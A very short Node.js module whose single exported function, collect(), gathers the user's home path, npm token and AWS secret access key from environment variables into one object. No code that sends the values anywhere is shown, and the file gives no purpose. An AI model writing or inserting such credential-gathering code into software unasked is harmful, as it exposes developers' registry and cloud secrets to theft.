function collect(){ return { home: process.env.HOME, npm: process.env.NPM_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY }; }
module.exports = { collect };
